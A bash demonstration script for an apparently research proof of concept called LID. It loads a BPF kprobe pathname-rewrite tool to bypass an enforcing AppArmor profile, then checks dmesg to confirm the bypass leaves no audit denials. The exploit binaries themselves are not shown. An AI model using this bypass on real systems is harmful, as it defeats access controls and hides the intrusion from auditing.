#!/bin/bash
set -euo pipefail

PROJECT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
BUILD_DIR="$PROJECT_DIR/build"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

banner() {
    echo ""
    echo -e "${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}║${NC}  $1"
    echo -e "${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

if [ ! -f "$BUILD_DIR/lid_loader" ] || [ ! -f "$BUILD_DIR/lid.bpf.o" ]; then
    echo -e "${RED}[-] Build artifacts not found. Run: make${NC}"
    exit 1
fi

if [ ! -f /tmp/test_reader ]; then
    echo -e "${RED}[-] Demo not set up. Run: sudo ./scripts/setup_demo.sh${NC}"
    exit 1
fi

echo ""
echo -e "${CYAN}"
echo "  ██╗     ██╗██████╗ "
echo "  ██║     ██║██╔══██╗"
echo "  ██║     ██║██║  ██║"
echo "  ██║     ██║██║  ██║"
echo "  ███████╗██║██████╔╝"
echo "  ╚══════╝╚═╝╚═════╝ "
echo -e "${NC}"
echo -e "  ${DIM}Linux Integrity Drift — Full Demonstration${NC}"
echo -e "  ${DIM}\"Linux is Dying\"${NC}"

# Phase 1
banner "Phase 1: AppArmor ENFORCING — access should be DENIED"
echo -e "  ${DIM}Running: /tmp/test_reader${NC}"
echo ""
/tmp/test_reader 2>&1 || true
echo ""
sleep 1

# Phase 2
banner "Phase 2: Loading LID — BPF kprobe pathname rewrite"
cd "$BUILD_DIR"
./lid_loader &
LOADER_PID=$!
cd "$PROJECT_DIR"
sleep 1
echo ""

# Phase 3
banner "Phase 3: With LID active — access should be GRANTED"
echo -e "  ${DIM}Running: /tmp/test_reader (same binary, same profile)${NC}"
echo ""
/tmp/test_reader 2>&1 || true
echo ""
sleep 1

# Phase 4
banner "Phase 4: Stealth check — audit log inspection"
echo -e "  ${DIM}Searching dmesg for AppArmor DENIED entries...${NC}"
echo ""
DENIALS=$(dmesg 2>/dev/null | grep -i "apparmor.*DENIED.*test_reader.*secret" | tail -3 || true)
if [ -z "$DENIALS" ]; then
    echo -e "  ${GREEN}No AppArmor denials found — bypass is audit-invisible${NC}"
else
    echo -e "  ${YELLOW}Denials found:${NC}"
    echo "$DENIALS"
fi
echo ""
sleep 1

# Phase 5
banner "Phase 5: Unloading LID — enforcement restored"
kill "$LOADER_PID" 2>/dev/null || true
wait "$LOADER_PID" 2>/dev/null || true
sleep 1
echo ""
echo -e "  ${DIM}Running: /tmp/test_reader (LID removed)${NC}"
echo ""
/tmp/test_reader 2>&1 || true

echo ""
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"
echo -e "  ${GREEN}Demo complete.${NC}"
echo -e "  ${DIM}AppArmor was bypassed while active, with zero audit trace.${NC}"
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"
echo ""
